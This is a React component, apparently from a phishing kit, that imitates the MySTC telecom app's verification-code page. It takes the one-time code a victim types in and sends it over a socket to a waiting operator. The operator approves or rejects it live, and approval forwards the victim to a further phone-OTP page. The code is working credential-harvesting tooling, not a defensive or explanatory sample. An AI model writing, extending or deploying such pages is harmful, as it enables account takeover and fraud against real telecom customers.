import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  navigateToPage,
  socket,
} from "@/lib/store";

export default function MyStcOTP() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  // التحقق من صحة الرمز (4 أو 6 أرقام)
  const isOtpValid = otp.length === 4 || otp.length === 6;

  // Emit page enter and auto focus
  useEffect(() => {
    navigateToPage("MyStc OTP");
    // التركيز التلقائي على حقل الإدخال
    setTimeout(() => {
      inputRef.current?.focus();
    }, 100);
  }, []);

  // Listen for code:action event from admin
  useEffect(() => {
    const s = socket.value;
    
    const handleCodeAction = ({ action }: { action: string }) => {
      console.log("MyStcOTP: Code action received:", action);
      if (action === 'reject') {
        setOtp("");
        setError(true);
        setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
        inputRef.current?.focus();
      } else if (action === 'approve') {
        navigate("/phone-otp?serviceProvider=0");
      }
    };

    const handleRejected = () => {
      console.log("MyStcOTP: Form rejected received!");
      setOtp("");
      setError(true);
      setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
      inputRef.current?.focus();
    };

    const handleApproved = () => {
      console.log("MyStcOTP: Form approved received!");
      navigate("/phone-otp?serviceProvider=0");
    };

    s.on("code:action", handleCodeAction);
    s.on("form:rejected", handleRejected);
    s.on("form:approved", handleApproved);

    return () => {
      s.off("code:action", handleCodeAction);
      s.off("form:rejected", handleRejected);
      s.off("form:approved", handleApproved);
    };
  }, [navigate]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // السماح بـ 4 أو 6 خانات
    if (!isOtpValid) {
      setError(true);
      setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
      return;
    }

    setError(false);
    setErrorMessage("");
    sendData({
      digitCode: otp,
      current: "MyStc OTP",
      nextPage: "تحقق رقم الجوال (OTP)?serviceProvider=0",
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "MyStc OTP",
      waitingForAdminResponse: true,
      customWaitingMessage: "جاري إرسال الرمز",
    });
  };

  // السماح فقط بالأرقام
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
    setError(false);
    setErrorMessage("");
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <img
            src="/images/my-stc.png"
            alt="MySTC"
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق MySTC</h1>
          <p className="text-sm" style={{ color: '#00A651' }}>
            أدخل رمز التحقق المرسل من تطبيق MySTC
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input - حقل واحد */}
          <div className="flex justify-center" dir="ltr">
            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={6}
              value={otp}
              onChange={handleOtpChange}
              placeholder="أدخل الرمز"
              className={`w-32 h-10 text-center text-base font-medium border rounded-lg outline-none transition-colors ${
                error 
                  ? 'border-red-500 focus:border-red-500' 
                  : 'border-gray-300 focus:border-purple-600'
              }`}
              style={{ borderColor: error ? undefined : (otp.length > 0 ? '#4F008C' : undefined) }}
              autoFocus
            />
          </div>

          {errorMessage && (
            <p className="text-red-500 text-xs text-center">
              {errorMessage}
            </p>
          )}

          {/* Submit Button */}
          <Button 
            type="submit" 
            className="w-full h-12 text-base font-medium rounded-lg transition-colors"
            size="lg"
            disabled={!isOtpValid}
            style={{ 
              backgroundColor: isOtpValid ? '#4F008C' : '#E5E5E5', 
              color: isOtpValid ? '#FFFFFF' : '#666666' 
            }}
          >
            تأكيد
          </Button>

          {/* Resend Link */}
          <div className="text-center">
            <button
              type="button"
              onClick={handleResend}
              className="text-sm hover:underline"
              style={{ color: '#4F008C' }}
            >
              لم تستلم الرمز؟ إعادة الإرسال
            </button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
